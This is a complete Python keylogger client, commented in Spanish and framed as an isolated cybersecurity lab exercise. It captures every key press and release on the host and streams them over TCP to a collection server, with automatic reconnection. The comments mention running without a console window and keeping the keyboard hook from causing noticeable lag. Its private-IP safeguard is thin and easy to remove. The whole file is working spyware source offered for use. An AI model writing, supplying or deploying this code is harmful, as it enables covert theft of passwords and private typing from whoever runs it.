#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cliente.py — Laboratorio educativo de ciberseguridad (entorno aislado).

Captura eventos de teclado del sistema donde se ejecuta y los transmite
por TCP a un servidor dentro de la misma red interna (192.168.5.0/24).

USO EXCLUSIVO EN LABORATORIO AISLADO Y CON FINES DEFENSIVOS/DIDÁCTICOS.

Variables de entorno (todas opcionales):
    LAB_SERVER_IP        IP del servidor Linux de análisis   (default 192.168.5.131)
    LAB_SERVER_PORT      Puerto TCP del servidor             (default 5000)
    LAB_FLUSH_INTERVAL   Segundos entre envíos por lote      (default 2.0)
    LAB_LOG_LEVEL        DEBUG|INFO|WARNING|ERROR             (default INFO)
    LAB_LOG_FILE         Ruta del log (default: cliente.log)
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import queue
import signal
import socket
import sys
import threading
import time
from dataclasses import dataclass, asdict
from typing import Optional

try:
    from pynput import keyboard  # type: ignore
except ImportError:
    print("Falta la dependencia 'pynput'. Instálala con: pip install pynput",
          file=sys.stderr)
    raise


# ---------------------------------------------------------------------------
# 1. Configuración
# ---------------------------------------------------------------------------
@dataclass(frozen=True)
class Config:
    server_ip: str
    server_port: int
    flush_interval: float
    log_level: str
    log_file: str

    @staticmethod
    def from_env_and_args() -> "Config":
        """Prioridad: CLI > variable de entorno > default seguro de lab."""
        parser = argparse.ArgumentParser(
            description="Cliente de captura de teclado para laboratorio aislado."
        )
        parser.add_argument("--ip", help="IP del servidor (LAN interna)")
        parser.add_argument("--port", type=int, help="Puerto TCP del servidor")
        parser.add_argument("--interval", type=float, help="Segundos entre envíos")
        args = parser.parse_args()

        ip = args.ip or os.getenv("LAB_SERVER_IP", "192.168.5.131")
        port = args.port or int(os.getenv("LAB_SERVER_PORT", "5000"))
        interval = args.interval or float(os.getenv("LAB_FLUSH_INTERVAL", "2.0"))
        level = os.getenv("LAB_LOG_LEVEL", "INFO").upper()
        log_file = os.getenv("LAB_LOG_FILE", "cliente.log")

        # Salvaguarda: impedir salir a Internet por error en el lab.
        if not ip.startswith(("192.168.", "10.", "172.")) and ip not in ("127.0.0.1",):
            raise SystemExit(
                f"[!] La IP {ip} no parece de red privada. "
                "Este script solo debe usarse en un laboratorio aislado."
            )
        return Config(ip, port, interval, level, log_file)


# ---------------------------------------------------------------------------
# 2. Logging
# ---------------------------------------------------------------------------
def setup_logging(level: str, log_file: str) -> logging.Logger:
    logger = logging.getLogger("cliente")
    logger.setLevel(getattr(logging, level, logging.INFO))
    fmt = logging.Formatter(
        "%(asctime)s | %(levelname)-7s | %(threadName)-10s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setFormatter(fmt)
    logger.addHandler(fh)
    # Log a consola solo si hay TTY y existe stderr.
    # Con --noconsole (o pythonw), sys.stderr es None → no hay consola.
    if sys.stderr is not None and getattr(sys.stderr, "isatty", lambda: False)():
        sh = logging.StreamHandler(sys.stderr)
        sh.setFormatter(fmt)
        logger.addHandler(sh)
    return logger


# ---------------------------------------------------------------------------
# 3. Captura de teclado (productor)
# ---------------------------------------------------------------------------
class KeyboardCapture:
    """
    Envuelve pynput y publica eventos en una cola.

    Por qué una cola: el callback de pynput corre en el hilo del hook del SO.
    Hacer I/O de red ahí dentro bloquearía el hook y se notaría en la VM
    (latencia al teclear). Un productor/consumidor desacopla captura y envío.
    """

    def __init__(self, out_queue: "queue.Queue[dict]", logger: logging.Logger):
        self._q = out_queue
        self._log = logger
        self._listener: Optional[keyboard.Listener] = None

    def _emit(self, kind: str, key: object) -> None:
        # Normalizamos la tecla a algo serializable y legible.
        try:
            if isinstance(key, keyboard.KeyCode):
                payload = {"kind": kind, "value": key.char}
            else:
                payload = {"kind": kind, "value": str(key).replace("Key.", "")}
        except Exception as exc:  # noqa: BLE001
            payload = {"kind": kind, "value": f"<error:{exc}>"}
        payload["ts"] = time.time()
        try:
            self._q.put_nowait(payload)
        except queue.Full:
            self._log.warning("Cola llena, descartando evento")

    def start(self) -> None:
        self._listener = keyboard.Listener(
            on_press=lambda k: self._emit("press", k),
            on_release=lambda k: self._emit("release", k),
        )
        self._listener.daemon = True
        self._listener.start()
        self._log.info("Captura de teclado iniciada")

    def stop(self) -> None:
        if self._listener:
            self._listener.stop()
            self._log.info("Captura de teclado detenida")


# ---------------------------------------------------------------------------
# 4. Envío por TCP (consumidor)
# ---------------------------------------------------------------------------
class TcpSender(threading.Thread):
    """
    Hilo consumidor: drena la cola por lotes y los envía por TCP.
    Protocolo: un JSON por línea (NDJSON) terminado en '\\n'.
    Reconexión con backoff exponencial acotado.
    """

    def __init__(
        self,
        cfg: Config,
        in_queue: "queue.Queue[dict]",
        stop_event: threading.Event,
        logger: logging.Logger,
    ):
        super().__init__(name="TcpSender", daemon=True)
        self._cfg = cfg
        self._q = in_queue
        self._stop = stop_event
        self._log = logger

    def _connect(self) -> socket.socket:
        delay = 1.0
        while not self._stop.is_set():
            try:
                s = socket.create_connection(
                    (self._cfg.server_ip, self._cfg.server_port), timeout=5.0
                )
                s.settimeout(5.0)
                self._log.info("Conectado a %s:%d",
                               self._cfg.server_ip, self._cfg.server_port)
                return s
            except OSError as exc:
                self._log.warning("Conexión fallida (%s). Reintento en %.1fs", exc, delay)
                self._stop.wait(delay)
                delay = min(delay * 2, 30.0)
        raise RuntimeError("Detenido antes de conectar")

    def run(self) -> None:
        sock: Optional[socket.socket] = None
        try:
            sock = self._connect()
            while not self._stop.is_set():
                batch = self._drain_batch(self._cfg.flush_interval)
                if not batch:
                    continue
                try:
                    for ev in batch:
                        sock.sendall((json.dumps(ev, ensure_ascii=False) + "\n").encode("utf-8"))
                except OSError as exc:
                    self._log.error("Error de envío: %s. Reconectando…", exc)
                    try:
                        sock.close()
                    except OSError:
                        pass
                    sock = self._connect()
        except Exception as exc:  # noqa: BLE001
            self._log.exception("Hilo emisor abortado: %s", exc)
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
            self._log.info("Hilo emisor finalizado")

    def _drain_batch(self, timeout: float) -> list[dict]:
        """Espera hasta `timeout`s y devuelve lo que haya en la cola."""
        batch: list[dict] = []
        try:
            first = self._q.get(timeout=timeout)
            batch.append(first)
        except queue.Empty:
            return batch
        while True:
            try:
                batch.append(self._q.get_nowait())
            except queue.Empty:
                break
        return batch


# ---------------------------------------------------------------------------
# 5. Orquestación y cierre limpio
# ---------------------------------------------------------------------------
class ClientApp:
    def __init__(self, cfg: Config, logger: logging.Logger):
        self._cfg = cfg
        self._log = logger
        self._q: "queue.Queue[dict]" = queue.Queue(maxsize=10_000)
        self._stop = threading.Event()
        self._capture = KeyboardCapture(self._q, logger)
        self._sender = TcpSender(cfg, self._q, self._stop, logger)

    def _install_signal_handlers(self) -> None:
        def handler(signum, _frame):
            self._log.info("Señal %s recibida. Cerrando…", signum)
            self._stop.set()

        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(sig, handler)
            except (ValueError, OSError):
                # En algunos entornos Windows sin consola no se pueden registrar.
                pass

    def run(self) -> int:
        self._install_signal_handlers()
        self._capture.start()
        self._sender.start()
        self._log.info("Cliente en marcha → %s:%d (intervalo %.1fs)",
                       self._cfg.server_ip, self._cfg.server_port,
                       self._cfg.flush_interval)
        try:
            while not self._stop.is_set():
                self._stop.wait(1.0)
        finally:
            self._capture.stop()
            # Damos un margen al emisor para vaciar la cola.
            self._stop.set()
            self._sender.join(timeout=5.0)
            self._log.info("Cliente detenido correctamente")
        return 0


def main() -> int:
    cfg = Config.from_env_and_args()
    logger = setup_logging(cfg.log_level, cfg.log_file)
    return ClientApp(cfg, logger).run()


if __name__ == "__main__":
    sys.exit(main())
